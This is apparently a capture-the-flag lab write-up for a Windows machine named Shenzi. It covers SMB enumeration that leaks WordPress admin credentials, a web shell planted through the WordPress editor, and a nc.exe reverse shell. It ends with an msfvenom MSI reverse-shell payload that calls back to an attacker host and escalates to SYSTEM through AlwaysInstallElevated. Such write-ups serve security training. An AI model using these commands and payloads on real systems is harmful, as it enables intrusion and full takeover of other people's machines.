# Shenzi

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.55 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 13:46 +08
Nmap scan report for 192.168.201.55
Host is up (0.18s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

Lots of ports here. FTP doesn't allow for anonymous access.&#x20;

### SMB Access -> WP Creds

`smbmap` shows that there are a few shares we can access:

```
$ smbmap -u guest -p '' -H 192.168.201.55            
[+] IP: 192.168.201.55:445      Name: 192.168.201.55                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IPC$                                                    READ ONLY       Remote IPC
        Shenzi                                                  READ ONLY
```

The share had a few interesting files:

```
$ smbclient -U guest //192.168.201.55/Shenzi         
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 23:45:09 2020
  ..                                  D        0  Thu May 28 23:45:09 2020
  passwords.txt                       A      894  Thu May 28 23:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 23:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 23:45:09 2020
  why.tmp                             A      213  Thu May 28 23:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 23:45:09 2020
```

`passwords.txt` contained some credentials to a Wordpress instance, while the rest of the files were rather uninteresting:&#x20;

```
$ cat passwords.txt
1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

### Web Enumeration -> WP RCE

Port 80 shows the default XAMPP page:

<figure><img src="../../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>

There was a PHPInfo page that we could view for more clues.&#x20;

<figure><img src="../../../.gitbook/assets/image (1612).png" alt=""><figcaption></figcaption></figure>

The only interesting thing to note is that the user is named `shenzi` on the machine. We need to be finding this wordpress instance. However, all directory scans failed to find any instance of `wp-content` or `wp-admin`.&#x20;

I was stuck here for a while, until I visited `/shenzi` to test, and it worked!

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

With this, we can easily login to the admin panel and replace one of the PHP files with a web shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (2725).png" alt=""><figcaption></figcaption></figure>

Then, we can get a reverse shell by downloading `nc.exe` onto the machine and executing it:

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### AlwaysInstallElevated -> SYSTEM

I ran `winPEAS.exe` to enumerate the machine for me. It picked up on AlwaysInstallElevated being misconfigured:

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Using this, we can generate an MSI payload using `msfvenom` and run it on the system, which would give us a reverse shell as the SYSTEM user.&#x20;

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.191 LPORT=21 -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

Afterwards, transfer this file over to the machine and run `msiexec` on it:

```
C:\Windows\Tasks>msiexec /quiet /qn /i shell.msi
```

This would give us a reverse shell as the SYSTEM user on a listener port:

<figure><img src="../../../.gitbook/assets/image (2358).png" alt=""><figcaption></figcaption></figure>
